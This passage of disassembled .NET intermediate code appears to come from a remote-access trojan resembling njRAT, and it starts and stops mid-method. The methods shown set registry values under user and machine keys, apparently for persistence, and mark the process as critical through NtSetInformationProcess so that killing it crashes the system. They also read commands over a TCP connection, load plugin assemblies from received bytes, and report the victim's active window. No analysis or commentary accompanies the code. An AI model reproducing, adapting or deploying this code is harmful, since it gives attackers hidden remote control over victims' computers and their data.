      IL_050c:  stloc.s    V_20
      IL_050e:  ldloc.s    V_20
      IL_0510:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0515:  ldloc.s    V_20
      IL_0517:  stloc.s    V_21
      IL_0519:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_051e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0523:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0528:  leave.s    IL_052a

    }  // end handler
    IL_052a:  ldloc.0
    IL_052b:  ldloc.3
    IL_052c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0531:  ret
  } // end of method L::inf

  .method public static void  ko() cil managed noinlining nooptimization
  {
    // 
    .maxstack  4
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             class [mscorlib]System.Threading.Thread V_3,
             int32 V_4,
             string V_5,
             string V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             string V_14,
             class [mscorlib]System.Exception V_15,
             class [mscorlib]System.Exception V_16,
             class [mscorlib]System.Exception V_17,
             class [mscorlib]System.Exception V_18,
             class [mscorlib]System.Exception V_19,
             class [mscorlib]System.Exception V_20,
             native int V_21)
    .try
    {
      IL_0000:  ldsfld     string L::sf
      IL_0005:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
      IL_000a:  stsfld     string L::sf
      IL_000f:  ldsfld     string L::x
      IL_0014:  ldstr      "https://"
      IL_0019:  ldstr      ""
      IL_001e:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0023:  stsfld     string L::x
      IL_0028:  ldsfld     string L::x
      IL_002d:  stloc.s    V_6
      IL_002f:  ldloc.s    V_6
      IL_0031:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
      IL_0036:  stsfld     string L::P
      IL_003b:  ldsfld     string L::ss
      IL_0040:  ldstr      "https://"
      IL_0045:  ldstr      ""
      IL_004a:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_004f:  stsfld     string L::ss
      IL_0054:  ldsfld     string L::ss
      IL_0059:  stloc.s    V_5
      IL_005b:  ldloc.s    V_5
      IL_005d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrReverse(string)
      IL_0062:  stsfld     string L::H
      IL_0067:  ldsfld     string L::Time
      IL_006c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0071:  stloc.s    V_4
      IL_0073:  br.s       IL_0085

      IL_0075:  ldc.i4     0x3e8
      IL_007a:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_007f:  ldloc.s    V_4
      IL_0081:  ldc.i4.1
      IL_0082:  sub.ovf
      IL_0083:  stloc.s    V_4
      IL_0085:  ldloc.s    V_4
      IL_0087:  ldc.i4.0
      IL_0088:  bne.un.s   IL_0075

      IL_008a:  leave.s    IL_009b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_008c:  dup
      IL_008d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0092:  stloc.s    V_7
      IL_0094:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0099:  leave.s    IL_009b

    }  // end handler
    IL_009b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_00a0:  brfalse.s  IL_00eb

    .try
    {
      IL_00a2:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_00a7:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00ac:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_00b1:  ldstr      "di"
      IL_00b6:  ldstr      "!"
      IL_00bb:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_00c0:  leave.s    IL_00e1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00c2:  dup
      IL_00c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c8:  stloc.s    V_8
      IL_00ca:  ldloc.s    V_8
      IL_00cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d1:  ldloc.s    V_8
      IL_00d3:  stloc.s    V_9
      IL_00d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00da:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00df:  leave.s    IL_00e1

    }  // end handler
    IL_00e1:  ldc.i4     0x1388
    IL_00e6:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_00eb:  ldc.i4.0
    IL_00ec:  stloc.0
    IL_00ed:  ldc.i4.1
    IL_00ee:  ldsfld     string L::RG
    IL_00f3:  ldloca.s   V_0
    IL_00f5:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_00fa:  stsfld     object L::MT
    IL_00ff:  ldloc.0
    IL_0100:  brtrue.s   IL_0107

    IL_0102:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0107:  call       void L::INS()
    IL_010c:  ldsfld     bool L::Idr
    IL_0111:  brtrue.s   IL_0136

    IL_0113:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
    IL_0118:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_011d:  stsfld     string L::EXE
    IL_0122:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
    IL_0127:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_012c:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0131:  stsfld     string L::DR
    IL_0136:  ldnull
    IL_0137:  ldftn      void L::RC()
    IL_013d:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0142:  ldc.i4.1
    IL_0143:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_0148:  stloc.3
    IL_0149:  ldloc.3
    IL_014a:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_014f:  ldc.i4.0
    IL_0150:  stloc.1
    IL_0151:  ldstr      ""
    IL_0156:  stloc.2
    IL_0157:  ldsfld     bool L::BD
    IL_015c:  brfalse.s  IL_0196

    .try
    {
      IL_015e:  ldnull
      IL_015f:  ldftn      void L::_Lambda__2(object,
                                              class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_0165:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_016a:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_016f:  ldc.i4.1
      IL_0170:  call       void L::pr(int32)
      IL_0175:  leave.s    IL_0196

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0177:  dup
      IL_0178:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_017d:  stloc.s    V_11
      IL_017f:  ldloc.s    V_11
      IL_0181:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0186:  ldloc.s    V_11
      IL_0188:  stloc.s    V_10
      IL_018a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_018f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0194:  leave.s    IL_0196

    }  // end handler
    IL_0196:  ldc.i4     0x3e8
    IL_019b:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_01a0:  ldsfld     bool L::Cn
    IL_01a5:  brtrue.s   IL_01ad

    IL_01a7:  ldstr      ""
    IL_01ac:  stloc.2
    IL_01ad:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    .try
    {
      IL_01b2:  ldloc.1
      IL_01b3:  ldc.i4.1
      IL_01b4:  add.ovf
      IL_01b5:  stloc.1
      IL_01b6:  ldloc.1
      IL_01b7:  ldc.i4.5
      IL_01b8:  bne.un.s   IL_01ef

      .try
      {
        IL_01ba:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_01bf:  ldc.i4     0x400
        IL_01c4:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_01c9:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_01ce:  leave.s    IL_01ef

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01d0:  dup
        IL_01d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01d6:  stloc.s    V_12
        IL_01d8:  ldloc.s    V_12
        IL_01da:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01df:  ldloc.s    V_12
        IL_01e1:  stloc.s    V_13
        IL_01e3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01ed:  leave.s    IL_01ef

      }  // end handler
      IL_01ef:  ldloc.1
      IL_01f0:  ldc.i4.8
      IL_01f1:  blt.s      IL_0222

      IL_01f3:  ldc.i4.0
      IL_01f4:  stloc.1
      IL_01f5:  call       string L::ACT()
      IL_01fa:  stloc.s    V_14
      IL_01fc:  ldloc.2
      IL_01fd:  ldloc.s    V_14
      IL_01ff:  ldc.i4.0
      IL_0200:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0205:  ldc.i4.0
      IL_0206:  beq.s      IL_0222

      IL_0208:  ldloc.s    V_14
      IL_020a:  stloc.2
      IL_020b:  ldstr      "act"
      IL_0210:  ldsfld     string L::Y
      IL_0215:  ldloc.s    V_14
      IL_0217:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_021c:  call       bool L::Send(string)
      IL_0221:  pop
      IL_0222:  ldsfld     bool L::Isu
      IL_0227:  brfalse    IL_033e

      .try
      {
        IL_022c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
        IL_0231:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0236:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_023b:  ldsfld     string L::sf
        IL_0240:  ldstr      "\\"
        IL_0245:  ldsfld     string L::RG
        IL_024a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_024f:  ldstr      ""
        IL_0254:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0259:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_025e:  ldsfld     string L::rgg
        IL_0263:  ldc.i4.0
        IL_0264:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0269:  brfalse.s  IL_0294

        IL_026b:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
        IL_0270:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0275:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_027a:  ldsfld     string L::sf
        IL_027f:  ldc.i4.1
        IL_0280:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0285:  ldsfld     string L::RG
        IL_028a:  ldsfld     string L::rgg
        IL_028f:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0294:  leave.s    IL_02b5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0296:  dup
        IL_0297:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_029c:  stloc.s    V_15
        IL_029e:  ldloc.s    V_15
        IL_02a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02a5:  ldloc.s    V_15
        IL_02a7:  stloc.s    V_16
        IL_02a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02b3:  leave.s    IL_02b5

      }  // end handler
      .try
      {
        IL_02b5:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
        IL_02ba:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02bf:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_02c4:  ldsfld     string L::sf
        IL_02c9:  ldstr      "\\"
        IL_02ce:  ldsfld     string L::RG
        IL_02d3:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02d8:  ldstr      ""
        IL_02dd:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_02e2:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_02e7:  ldsfld     string L::rgg
        IL_02ec:  ldc.i4.0
        IL_02ed:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_02f2:  brfalse.s  IL_031d

        IL_02f4:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
        IL_02f9:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02fe:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0303:  ldsfld     string L::sf
        IL_0308:  ldc.i4.1
        IL_0309:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_030e:  ldsfld     string L::RG
        IL_0313:  ldsfld     string L::rgg
        IL_0318:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_031d:  leave.s    IL_033e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_031f:  dup
        IL_0320:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0325:  stloc.s    V_17
        IL_0327:  ldloc.s    V_17
        IL_0329:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_032e:  ldloc.s    V_17
        IL_0330:  stloc.s    V_18
        IL_0332:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0337:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_033c:  leave.s    IL_033e

      }  // end handler
      IL_033e:  leave.s    IL_035f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0340:  dup
      IL_0341:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0346:  stloc.s    V_19
      IL_0348:  ldloc.s    V_19
      IL_034a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_034f:  ldloc.s    V_19
      IL_0351:  stloc.s    V_20
      IL_0353:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0358:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_035d:  leave.s    IL_035f

    }  // end handler
    IL_035f:  br         IL_0196
  } // end of method L::ko

  .method public static string  md5(uint8[] B) cil managed
  {
    // 
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             uint8 V_2,
             int32 V_3,
             uint8[] V_4)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0005:  ldarg.0
    IL_0006:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000b:  starg.s    B
    IL_000d:  ldstr      ""
    IL_0012:  stloc.0
    IL_0013:  ldarg.0
    IL_0014:  stloc.s    V_4
    IL_0016:  ldc.i4.0
    IL_0017:  stloc.3
    IL_0018:  br.s       IL_0036

    IL_001a:  ldloc.s    V_4
    IL_001c:  ldloc.3
    IL_001d:  ldelem.u1
    IL_001e:  stloc.2
    IL_001f:  ldloc.0
    IL_0020:  ldloca.s   V_2
    IL_0022:  ldstr      "x2"
    IL_0027:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0031:  stloc.0
    IL_0032:  ldloc.3
    IL_0033:  ldc.i4.1
    IL_0034:  add.ovf
    IL_0035:  stloc.3
    IL_0036:  ldloc.3
    IL_0037:  ldloc.s    V_4
    IL_0039:  ldlen
    IL_003a:  conv.ovf.i4
    IL_003b:  blt.s      IL_001a

    IL_003d:  ldloc.0
    IL_003e:  ret
  } // end of method L::md5

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  Plugin(uint8[] b,
                                       string c) cil managed
  {
    // 
    .maxstack  3
    .locals init (class [mscorlib]System.Reflection.Module V_0,
             object V_1,
             class [mscorlib]System.Type V_2,
             int32 V_3,
             class [mscorlib]System.Reflection.Module[] V_4,
             int32 V_5,
             class [mscorlib]System.Type[] V_6)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000b:  stloc.s    V_4
    IL_000d:  ldc.i4.0
    IL_000e:  stloc.3
    IL_000f:  br.s       IL_0065

    IL_0011:  ldloc.s    V_4
    IL_0013:  ldloc.3
    IL_0014:  ldelem.ref
    IL_0015:  stloc.0
    IL_0016:  ldloc.0
    IL_0017:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001c:  stloc.s    V_6
    IL_001e:  ldc.i4.0
    IL_001f:  stloc.s    V_5
    IL_0021:  br.s       IL_0059

    IL_0023:  ldloc.s    V_6
    IL_0025:  ldloc.s    V_5
    IL_0027:  ldelem.ref
    IL_0028:  stloc.2
    IL_0029:  ldloc.2
    IL_002a:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_002f:  ldstr      "."
    IL_0034:  ldarg.1
    IL_0035:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003a:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_003f:  brfalse.s  IL_0053

    IL_0041:  ldloc.0
    IL_0042:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_0047:  ldloc.2
    IL_0048:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_004d:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0052:  ret

    IL_0053:  ldloc.s    V_5
    IL_0055:  ldc.i4.1
    IL_0056:  add.ovf
    IL_0057:  stloc.s    V_5
    IL_0059:  ldloc.s    V_5
    IL_005b:  ldloc.s    V_6
    IL_005d:  ldlen
    IL_005e:  conv.ovf.i4
    IL_005f:  blt.s      IL_0023

    IL_0061:  ldloc.3
    IL_0062:  ldc.i4.1
    IL_0063:  add.ovf
    IL_0064:  stloc.3
    IL_0065:  ldloc.3
    IL_0066:  ldloc.s    V_4
    IL_0068:  ldlen
    IL_0069:  conv.ovf.i4
    IL_006a:  blt.s      IL_0011

    IL_006c:  ldnull
    IL_006d:  ret
  } // end of method L::Plugin

  .method public static void  pr(int32 i) cil managed
  {
    // 
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0005:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000a:  ldc.i4.s   29
      IL_000c:  ldarga.s   i
      IL_000e:  ldc.i4.4
      IL_000f:  call       int32 L::NtSetInformationProcess(native int,
                                                            int32,
                                                            int32&,
                                                            int32)
      IL_0014:  pop
      IL_0015:  leave.s    IL_0032

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0017:  dup
      IL_0018:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001d:  stloc.0
      IL_001e:  ldloc.0
      IL_001f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0024:  ldloc.0
      IL_0025:  stloc.1
      IL_0026:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0030:  leave.s    IL_0032

    }  // end handler
    IL_0032:  ret
  } // end of method L::pr

  .method public static void  RC() cil managed
  {
    // 
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int32 V_2,
             int64 V_3,
             string V_4,
             int32 V_5,
             class [mscorlib]System.Threading.Thread V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             int32 V_11,
             char V_12)
    IL_0000:  ldstr      ""
    IL_0005:  stsfld     string L::lastcap
    IL_000a:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
    IL_000f:  brfalse    IL_01eb

    IL_0014:  ldc.i4.m1
    IL_0015:  conv.i8
    IL_0016:  stloc.0
    IL_0017:  ldc.i4.0
    IL_0018:  stloc.1
    .try
    {
      IL_0019:  ldloc.1
      IL_001a:  ldc.i4.1
      IL_001b:  add.ovf
      IL_001c:  stloc.1
      IL_001d:  ldloc.1
      IL_001e:  ldc.i4.s   10
      IL_0020:  bne.un.s   IL_002a

      IL_0022:  ldc.i4.0
      IL_0023:  stloc.1
      IL_0024:  ldc.i4.1
      IL_0025:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_002a:  ldsfld     bool L::Cn
      IL_002f:  brtrue.s   IL_0036

      IL_0031:  leave      IL_01eb

      IL_0036:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
      IL_003b:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0040:  ldc.i4.1
      IL_0041:  bge.s      IL_0055

      IL_0043:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
      IL_0048:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_004d:  ldc.i4.m1
      IL_004e:  ldc.i4.0
      IL_004f:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_0054:  pop
      IL_0055:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
      IL_005a:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_005f:  ldc.i4.0
      IL_0060:  ble        IL_01ca

      IL_0065:  ldloc.0
      IL_0066:  ldc.i4.m1
      IL_0067:  conv.i8
      IL_0068:  bne.un     IL_00f9

      IL_006d:  ldstr      ""
      IL_0072:  stloc.s    V_4
      IL_0074:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
      IL_0079:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_007e:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_0083:  stloc.s    V_5
      IL_0085:  ldloc.s    V_5
      IL_0087:  ldc.i4.m1
      IL_0088:  sub
      IL_0089:  switch     ( 
                            IL_0098,
                            IL_009d)
      IL_0096:  br.s       IL_00d1

      IL_0098:  leave      IL_01eb

      IL_009d:  ldloc.s    V_4
      IL_009f:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_00a4:  stloc.0
      IL_00a5:  ldstr      ""
      IL_00aa:  stloc.s    V_4
      IL_00ac:  ldloc.0
      IL_00ad:  ldc.i4.0
      IL_00ae:  conv.i8
      IL_00af:  bne.un.s   IL_00bf

      IL_00b1:  ldstr      ""
      IL_00b6:  call       bool L::Send(string)
      IL_00bb:  pop
      IL_00bc:  ldc.i4.m1
      IL_00bd:  conv.i8
      IL_00be:  stloc.0
      IL_00bf:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
      IL_00c4:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00c9:  ldc.i4.0
      IL_00ca:  bgt.s      IL_0055

      IL_00cc:  br         IL_0019

      IL_00d1:  ldloc.s    V_4
      IL_00d3:  ldloc.s    V_5
      IL_00d5:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_00da:  stloc.s    V_12
      IL_00dc:  ldloca.s   V_12
      IL_00de:  call       instance string [mscorlib]System.Char::ToString()
      IL_00e3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00e8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_00ed:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00f2:  stloc.s    V_4
      IL_00f4:  br         IL_0074

      IL_00f9:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
      IL_00fe:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0103:  ldc.i4.1
      IL_0104:  add.ovf
      IL_0105:  ldc.i4.1
      IL_0106:  sub.ovf
      IL_0107:  ldc.i4.1
      IL_0108:  add.ovf
      IL_0109:  newarr     [mscorlib]System.Byte
      IL_010e:  stsfld     uint8[] L::b
      IL_0113:  ldloc.0
      IL_0114:  ldsfld     class [mscorlib]System.IO.MemoryStream L::MeM
      IL_0119:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_011e:  sub.ovf
      IL_011f:  stloc.3
      IL_0120:  ldsfld     uint8[] L::b
      IL_0125:  ldlen
      IL_0126:  conv.ovf.i4
      IL_0127:  conv.i8
      IL_0128:  ldloc.3
      IL_0129:  ble.s      IL_0140

      IL_012b:  ldloc.3
      IL_012c:  ldc.i4.1
      IL_012d:  conv.i8
